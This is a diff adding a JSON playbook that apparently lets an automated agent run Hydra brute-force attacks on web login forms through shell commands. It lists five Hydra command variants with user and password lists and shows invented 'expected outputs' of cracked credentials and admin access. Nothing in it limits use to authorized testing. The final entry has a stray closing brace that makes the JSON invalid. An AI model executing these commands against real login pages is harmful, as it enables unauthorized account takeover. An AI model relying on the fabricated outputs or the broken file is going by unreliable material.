@@ -1,0 +1,30 @@
+{
+  "name": "hydra_http_post_form_attack",
+  "description": "Bruteforce HTTP POST forms (login pages) using Hydra",
+  "pattern": "hydra.*http|web.*form|http.*post|login.*bruteforce",
+  "parameters": ["target_url", "form_params", "userlist", "passlist"],
+  "sequence": [
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "hydra", "args": ["-L", "{{userlist}}", "-P", "{{passlist}}", "{{target_url}}", "http-post-form", "{{form_params}}"]},
+      "expected_output": {"type": "string", "example": "Hydra v9.4 bruteforcing web form\n[80][http-post-form] host: example.com   login: admin   password: admin123\n[80][http-post-form] host: example.com   login: user1   password: password123\n2 valid web credentials found"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "hydra -l admin -P {{passlist}} {{target_url}} http-post-form '/login.php:username=^USER^&password=^PASS^:F=incorrect'"]},
+      "expected_output": {"type": "string", "example": "Testing against /login.php endpoint\n[80][http-post-form] host: example.com   login: admin   password: secret2024\nSuccess: admin panel access obtained"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "hydra", "args": ["-L", "{{userlist}}", "-P", "{{passlist}}", "-f", "{{target_url}}", "http-post-form", "{{form_params}}"]},
+      "expected_output": {"type": "string", "example": "Using -f flag (exit after first valid)\n[80][http-post-form] host: example.com   login: admin   password: admin\nValid credential found, stopping attack"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "hydra -V -L {{userlist}} -P {{passlist}} {{target_url}} http-post-form '{{form_params}}' | grep -E 'login:|password:'"]},
+      "expected_output": {"type": "string", "example": "Verbose output filtered:\nlogin: admin   password: password123\nlogin: user1   password: user1pass\n2 credentials extracted"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "hydra", "args": ["-L", "{{userlist}}", "-P", "{{passlist}}", "-t", "10", "-w", "30", "{{target_url}}", "http-post-form", "{{form_params}}"]},
+      "expected_output": {"type": "string", "example": "10 tasks, 30 second timeout per attempt\nCompleted in 4 minutes, 3 valid logins found"}}
+    }
+  ],
+  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
+  "created_by": "neural_mesh_v5.2_generator"
+}
